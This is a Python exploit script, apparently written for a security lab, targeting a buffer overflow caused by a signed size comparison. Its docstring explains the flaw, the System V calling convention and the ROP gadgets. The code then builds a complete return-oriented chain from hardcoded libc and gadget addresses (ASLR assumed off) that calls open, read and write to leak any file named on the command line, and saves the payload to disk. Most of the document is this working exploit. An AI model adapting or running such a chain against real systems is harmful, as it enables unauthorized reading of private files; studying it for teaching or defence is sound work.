#!/usr/bin/python3

import sys


"""
Creating a bufffer overflow:
    * i and fsize are compared on line 21, which reflects as a cmp instruction
      in the asm code 
    * the cmp instruction on x86 subtracts the operands setting the ZERO or 
      CARRY flags
    * to create a buffer overflow we just need to cause read_size = fsize, which
      happens when the subtraction sets either the ZERO or CARRY flag (not both)
      (see aldeid.com/wiki/X86-assembly/Instructions/cmp)
    * i must be at most 24 but it can be negative so then the subtraction
      sets the CARRY flag: 
        -> fsize - i = fsize - (-1) = fsize + 1
        -> rax - rdx > 0
    * so if we set i < 0 then read_size = fsize so any file will be completely 
      read regardless of the buffer size

Useful addresses:
    * open function in libc: 0x7ffff7b04030
    * read function in libc: 0x7ffff7b04250
    * write function in libc:  0x7ffff7b042b0
    * writable memory in libc area that we do not need otherwise:
      0x00007ffff7dd1000 to 0x00007ffff7dd7000
      24576 bytes (identified with vmmap)
    
Arguments to function:
    * read needs the file descriptor returned by open. Since 0, 1, 2 are
      stdin, stdout and stderr, and the exploit file should already be closed,
      the value returned by open for the file we choose should be 3 
      (file descriptors are allocated in sequence)
    * the buffer can be any writable memory location that we don't need 
      otherwise, so we can use the identified segment of libc
    * the number of bytes can be as much space as we have in the buffer: 24576

How to pass the arguments:
    * in 64 bit System V AMD64 ABI arguments to fucntions are passed the first 5
    in rdi, rsi, rdx, rcx, r8, r9
    * we need only rdi, rsi, rdx as our function calls only take 2 or 3 args
    
open(filename, 0)
    rdi = &filename
    rsi = 0
    return address overwritten to libc open
    
read(3, buffer, 24576)
    rdi = 3
    rsi = &buffer
    rdx = 24576 (0x6000)
    return address overwritten to libc read

write(1, buffer, 24576)
    rdi = 1
    rsi = &buffer
    rdx = 24576
    return address overwritten to libc write
    
Gadgets:
    0x00000000004008c3 : (5fc3)	pop    rdi;	ret
    0x00007ffff7a2d2e8 : (5ec3)	pop    rsi;	ret
    0x00007ffff7a0eb92 : (5ac3)	pop    rdx;	ret

Instruction semantics:
(from felixcloutier.com/x86)

    * leave:
        mov rsp, rbp (rsp = rbp)
        pop rbp
    * ret:
        pop rip  
"""


def pack_addr(addr):
    return addr.to_bytes(8, 'little')


# gadgets
pop_rdi = pack_addr(0x00000000004008c3)
pop_rsi = pack_addr(0x00007ffff7a2d2e8)
pop_rdx = pack_addr(0x00007ffff7a0eb92)
push_rax = pack_addr(0x00007ffff7a418fd)

# libc functions
libc_open = pack_addr(0x7ffff7b04030)
libc_read = pack_addr(0x7ffff7b04250)
libc_write = pack_addr(0x7ffff7b042b0)
libc_exit = pack_addr(0x7ffff7a47030)

# address of buffer to read into and write out of
buf_addr = pack_addr(0x00007ffff7dd1000)

# File name to leak (null terminated) taken as cmd line arg or input
if len(sys.argv) == 2:
    FILENAME = sys.argv[1].encode()
else:
    FILENAME = input("Enter filename to leak (max 55 chars): ").encode()
FILENAME += b"\x00"

# address of the top of the buffer we are overflowing
fname_addr = pack_addr(0x7fffffffddc0)

# filename goes on top of stack which has fixed address with ASLR off
# so we can refer to it later
print("Writing filename to the stack...")
EXPLOIT = b""
EXPLOIT += FILENAME

# dummy data until return address
# note we don't care about RBP and RSP being messed up as 
# we never use them again
print("Filling bytes with dummy data...")
EXPLOIT += (56 - len(FILENAME)) * b"A"

print("Overwriting return address with gadgets...")
print("Building sequence of libc calls:")

# open(filename, 0)
print("open(filename, 0)")
EXPLOIT += pop_rdi
EXPLOIT += fname_addr
EXPLOIT += pop_rsi
EXPLOIT += pack_addr(0x0)
EXPLOIT += libc_open

# read(3, buffer, 24576)
print("read(3, buffer, 24576)")
EXPLOIT += pop_rdi
EXPLOIT += pack_addr(0x3)
EXPLOIT += pop_rsi
EXPLOIT += buf_addr
EXPLOIT += pop_rdx
EXPLOIT += pack_addr(0x6000)
EXPLOIT += libc_read

# write(1, buffer, 24576)
print("write(1, buffer, 24576)")
EXPLOIT += pop_rdi
EXPLOIT += 0x1.to_bytes(8, 'little')
EXPLOIT += pop_rsi
EXPLOIT += buf_addr
EXPLOIT += pop_rdx
EXPLOIT += 0x6000.to_bytes(8, 'little')
EXPLOIT += libc_write

# exit "gracefully"
print("exit")
EXPLOIT += libc_exit

# Write our payload to file
print("Writing payload to file...")
with open("exploit", "wb") as f:
    f.write(EXPLOIT)
    
print("Done!")

